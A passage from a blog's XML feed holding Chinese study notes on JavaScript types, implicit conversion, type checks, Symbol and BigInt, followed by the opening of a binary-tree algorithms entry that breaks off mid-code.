        <content type="html"><![CDATA[<h2 id="JS基本数据类型与类型转换"><a href="#JS基本数据类型与类型转换" class="headerlink" title="JS基本数据类型与类型转换"></a>JS基本数据类型与类型转换</h2><pre class=" language-js"><code class="language-js">ES5基本有<span class="token number">5</span>种简单数据类型：String，Number，Boolean，Null，undefined。一种复杂的数据类型Object。ES6新增一种简单数据类型：Symbol<span class="token punctuation">,</span>还有BigIntJS是动态类型语言，所以类型不同的时候进行运算会进行类型转换。</code></pre><h3 id="转字符串"><a href="#转字符串" class="headerlink" title="转字符串"></a>转字符串</h3><ul><li>转字符串可以理解为 + “”，底层是toString方法，其中对象转为[object object]，数组去括号+“”</li></ul><pre class=" language-js"><code class="language-js"><span class="token number">2</span><span class="token operator">+</span><span class="token string">"3"</span>          <span class="token comment" spellcheck="true">//Number(2).toString()+"3"</span><span class="token boolean">true</span><span class="token operator">+</span><span class="token string">"1"</span>       <span class="token comment" spellcheck="true">//Boolean(true).toString()+"1"</span><span class="token string">""</span><span class="token operator">+</span><span class="token punctuation">{</span><span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">//输出[object object]</span><span class="token string">""</span><span class="token operator">+</span><span class="token punctuation">{</span>A<span class="token punctuation">:</span><span class="token number">123</span><span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">//[object object]</span><span class="token string">"123"</span><span class="token operator">==</span><span class="token punctuation">{</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token string">"123"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//true，因为重写了toString方法</span><span class="token string">""</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token comment" spellcheck="true">//""</span><span class="token string">""</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>     <span class="token comment" spellcheck="true">//"1,2,3"</span></code></pre><h3 id="转布尔型"><a href="#转布尔型" class="headerlink" title="转布尔型"></a>转布尔型</h3><p>Boolean()传入变量</p><p>0，NaN，””，null，undefined，false直接转换成false，其余都是真</p><pre class=" language-js"><code class="language-js"><span class="token operator">!</span><span class="token operator">!</span><span class="token string">"123"</span>       <span class="token comment" spellcheck="true">//true</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">{</span><span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">//true</span></code></pre><h3 id="一道题"><a href="#一道题" class="headerlink" title="一道题"></a>一道题</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> aLi <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectrAll</span><span class="token punctuation">(</span><span class="token string">"li"</span><span class="token punctuation">)</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> item<span class="token punctuation">,</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>item <span class="token operator">=</span> aLi<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//每次赋值都返回当前值，当最后输出undefined是转布尔false</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h3 id="转数值"><a href="#转数值" class="headerlink" title="转数值"></a>转数值</h3><p>Number()除了0，“”，false会转成0，true转成1，其余都是调用toSring若是数值形式就转数值，不然是NaN</p><pre class=" language-js"><code class="language-js"><span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//NaN</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">"NaN"</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//NaN</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">0123</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//83</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">"0123"</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//123</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">"Infinity"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Infinity</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//123   [123].toString()</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">123</span>，<span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//NaN   </span></code></pre><h3 id="运算符带来的强制类型转换"><a href="#运算符带来的强制类型转换" class="headerlink" title="运算符带来的强制类型转换"></a>运算符带来的强制类型转换</h3><p>有字符串时加法会把其余类型转换为字符串</p><p>-，*，、，%优先转数值，+ 除外</p><pre class=" language-js"><code class="language-js"><span class="token string">"3"</span><span class="token operator">-</span><span class="token string">"2"</span>            <span class="token comment" spellcheck="true">//1</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">"1"</span>            <span class="token comment" spellcheck="true">//"51"</span><span class="token string">"3"</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span>            <span class="token comment" spellcheck="true">//"321"</span><span class="token string">"312"</span><span class="token operator">*</span><span class="token number">1</span>            <span class="token comment" spellcheck="true">//312</span><span class="token number">123</span><span class="token operator">+</span><span class="token keyword">null</span>           <span class="token comment" spellcheck="true">//123+Number(null)</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">{</span><span class="token punctuation">}</span>              <span class="token comment" spellcheck="true">//两个对象相加调用toString，""+[object object] = [object object]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span>              <span class="token comment" spellcheck="true">//{}解析为代码块，+[]，优先转为数值，0</span><span class="token comment" spellcheck="true">// 至于为什么解析成了代码块，和js引擎的解析相关，在V8，Chrome的JavaScript引擎中，它检查的第一件事一开始是否是 {，如果是，则解析为block。</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">//"1,22,3"</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"1"</span>         <span class="token comment" spellcheck="true">// true</span></code></pre><p>在js中，加法运算的规则很简单，只会触发两种情况:</p><blockquote><ol><li>number + number</li><li>string + string</li></ol><p>除了这两种，若：</p><p>如果有一个数为string，则将另一个操作数隐式的转换为string，然后通过字符串拼接得出结果。</p><p>如果为布尔值这种简单的数据类型，那么将会转换为number类型来进行运算得出结果。</p><p>如果操作数为对象或者是数组这种复杂的数据类型，那么就将两个操作数都转换为字符串，进行拼接 </p></blockquote><h2 id="JS如何进行类型判断"><a href="#JS如何进行类型判断" class="headerlink" title="JS如何进行类型判断"></a>JS如何进行类型判断</h2><ul><li>typeof关键字，存在问题</li></ul><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// number</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// boolean</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token string">'str'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// string</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// object     []数组的数据类型在 typeof 中被解释为 object</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// function</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// object</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> undefined<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// undefined</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// object     null 的数据类型被 typeof 解释为 object</span><span class="token comment" spellcheck="true">//这是js发展过程中设计者的重大失误，早期准备更改null的类型为null，由于当时已经有大量网站使用了null，如果更改，将导致很多网站的逻辑出现漏洞问题，就没有更改过来</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">new</span> <span class="token class-name">Boolean</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//object</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">new</span> <span class="token class-name">Number</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//object</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//object</span><span class="token comment" spellcheck="true">//对于一些创建的对象，它们都会返回'object'</span></code></pre><ul><li><p>instanceof关键字：</p><p>判断对象是否是某一数据类型（如Array）的实例 ，存在问题</p></li></ul><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token keyword">instanceof</span> <span class="token class-name">Number</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token keyword">instanceof</span> <span class="token class-name">Boolean</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// false </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'str'</span> <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// false  </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">instanceof</span> <span class="token class-name">Function</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// true  </span><span class="token comment" spellcheck="true">//问题：字面值被实例化才可，因为字面值不存在__proto__</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Number</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">Number</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Boolean</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">Boolean</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// true </span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">'str'</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// true  </span></code></pre><ul><li>Object.prototype.toString.call()</li></ul><pre class=" language-js"><code class="language-js">Object<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//"function Object() { [native code] }"</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//"[object Object]"</span><span class="token comment" spellcheck="true">//Object对象和它的原型链上各自有一个toString()方法，第一个返回的是一个函数，第二个返回的是值类型。</span><span class="token keyword">var</span> a <span class="token operator">=</span> Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">'str'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>undefined<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// [object Number]</span><span class="token comment" spellcheck="true">// [object Boolean]</span><span class="token comment" spellcheck="true">// [object String]</span><span class="token comment" spellcheck="true">// [object Array]</span><span class="token comment" spellcheck="true">// [object Function]</span><span class="token comment" spellcheck="true">// [object Object]</span><span class="token comment" spellcheck="true">// [object Undefined]</span><span class="token comment" spellcheck="true">// [object Null]</span></code></pre><h3 id="例：判断数组"><a href="#例：判断数组" class="headerlink" title="例：判断数组"></a>例：判断数组</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>arr <span class="token keyword">instanceof</span> <span class="token class-name">Array</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'[object Array]'</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>arr<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Arrayarr<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> Array<span class="token punctuation">.</span>prototype</code></pre><h2 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h2><ul><li>为什么要用Symbol？</li></ul><p>ES5里面的对象的属性名是字符串，当我们使用时，若想添加一些新属性，可能会出现重名的情况，于是我们借助Symbol来生成一个独一无二的值，这样就可以防止属性名的冲突了。</p><ul><li>Symbol是什么</li></ul><p>她是ES6新引入的一种原始类型数据，使用Symbol可以直接生成一个新的值。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> a1 <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">"a1"</span><span class="token punctuation">)</span><span class="token keyword">let</span> a2 <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">"a2"</span><span class="token punctuation">)</span>a1<span class="token operator">===</span>a2 <span class="token comment" spellcheck="true">//false</span></code></pre><h2 id="Bigint"><a href="#Bigint" class="headerlink" title="Bigint"></a>Bigint</h2><p>JS 中的<code>Number</code>类型只能安全地表示<code>-9007199254740991 (-(2^53-1))</code> 和<code>9007199254740991(2^53-1)</code>之间的整数，任何超出此范围的整数值都可能失去精度。 </p><pre class=" language-js"><code class="language-js"><span class="token number">90099999999999992</span> <span class="token operator">==</span> <span class="token number">90099999999999993</span> <span class="token comment" spellcheck="true">//true</span><span class="token comment" spellcheck="true">//使用新的数据类型BigInt  直接在数字后面加n即可</span>90099999999999992n <span class="token operator">==</span> 90099999999999993n <span class="token comment" spellcheck="true">//false</span><span class="token keyword">typeof</span> 90099999999999992n  <span class="token comment" spellcheck="true">//"bigint"</span></code></pre><h2 id="什么情况下-a-a-1"><a href="#什么情况下-a-a-1" class="headerlink" title="什么情况下 a === a - 1"></a>什么情况下 a === a - 1</h2><ul><li>正负Infinity</li><li>不可被精确表示的值</li></ul><blockquote><p>在 JavaScript 里，整数可以被精确表示的范围是从-2 <strong> 53 + 1到2 </strong> 53 - 1，即-9007199254740991到9007199254740991。超过这个数值的整数，都不能被精确表示。<br>常量 Number.MAX_SAFE_INTEGER 和 Number.MIN_SAFE_INTEGER分别对应9007199254740991和-9007199254740991。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> Number<span class="token punctuation">.</span>MIN_SAFE_INTEGER <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">===</span> a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span><span class="token keyword">let</span> a <span class="token operator">=</span> Number<span class="token punctuation">.</span>MAX_SAFE_INTEGER <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">===</span> a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false</span><span class="token keyword">let</span> a <span class="token operator">=</span> Number<span class="token punctuation">.</span>MAX_SAFE_INTEGER <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">===</span> a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false</span><span class="token keyword">let</span> a <span class="token operator">=</span> Number<span class="token punctuation">.</span>MAX_SAFE_INTEGER <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">===</span> a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false</span><span class="token keyword">let</span> a <span class="token operator">=</span> Number<span class="token punctuation">.</span>MAX_SAFE_INTEGER <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">===</span> a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span><span class="token keyword">let</span> a <span class="token operator">=</span> Number<span class="token punctuation">.</span>MAX_SAFE_INTEGER <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">===</span> a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span></code></pre><ul><li><a href="https://www.jinjingxuan.com/2020/07/11/%E6%95%B4%E7%90%86-js%E7%9A%84%E6%95%B0%E5%80%BC%E8%8C%83%E5%9B%B4/" target="_blank" rel="noopener">js的数值范围</a></li></ul><h2 id="什么情况下-a-1-amp-amp-a-2-amp-amp-a-3为true成立"><a href="#什么情况下-a-1-amp-amp-a-2-amp-amp-a-3为true成立" class="headerlink" title="什么情况下 a==1&amp;&amp;a==2&amp;&amp;a==3为true成立"></a>什么情况下 a==1&amp;&amp;a==2&amp;&amp;a==3为true成立</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>  i<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>  toString<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>i<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// true</span><span class="token comment" spellcheck="true">// a是一个对象，在判断时会调用toString方法，而我们把toString方法重写了</span><span class="token comment" spellcheck="true">// 如果改成 === 则不成立，类型不同直接返回 false，不会隐式转换</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法-二叉树相关</title>
      <link href="2020/03/05/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9B%B8%E5%85%B3/"/>
      <url>2020/03/05/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<ul><li>二叉树的前序遍历，中序遍历，后序遍历的递归与非递归</li><li>判断二叉树是否相同</li><li>判断二叉树是否对称</li><li>求二叉树的深度</li><li>翻转二叉树</li><li>二叉树的层次遍历</li><li>有序数组转二叉搜索树</li><li>验证二叉搜索树</li><li>判断平衡二叉树</li><li>验证前序序列</li><li>求二叉树的宽度</li><li>前序中序构造二叉树</li><li>二叉树的右视图</li><li>二叉树展开为链表</li></ul><h2 id="二叉树的前序遍历，中序遍历，后序遍历的递归与非递归"><a href="#二叉树的前序遍历，中序遍历，后序遍历的递归与非递归" class="headerlink" title="二叉树的前序遍历，中序遍历，后序遍历的递归与非递归"></a>二叉树的前序遍历，中序遍历，后序遍历的递归与非递归</h2><p>给一棵二叉树</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> root <span class="token operator">=</span> <span class="token punctuation">{</span>val<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>left<span class="token punctuation">:</span> <span class="token punctuation">{</span>    val<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span>    left<span class="token punctuation">:</span> <span class="token punctuation">{</span>      val<span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    right<span class="token punctuation">:</span><span class="token punctuation">{</span>      val<span class="token punctuation">:</span><span class="token number">5</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>right<span class="token punctuation">:</span> <span class="token punctuation">{</span>    val<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span>    left<span class="token punctuation">:</span> <span class="token punctuation">{</span>      val<span class="token punctuation">:</span> <span class="token number">6</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    right<span class="token punctuation">:</span> <span class="token punctuation">{</span>      val<span class="token punctuation">:</span> <span class="token number">7</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 树节点构造方式</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>val <span class="token operator">=</span> val<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//先序递归</span><span class="token keyword">function</span> <span class="token function">DLR</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>root<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DLR</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DLR</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//中序递归</span><span class="token keyword">function</span> <span class="token function">LDR</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>root<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">LDR</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//先遍历到最左边的节点，然后输出</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">LDR</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//后序递归</span><span class="token keyword">function</span> <span class="token function">LRD</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">LRD</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">LRD</span><span class="token punctuation">(</span>root<span class="token 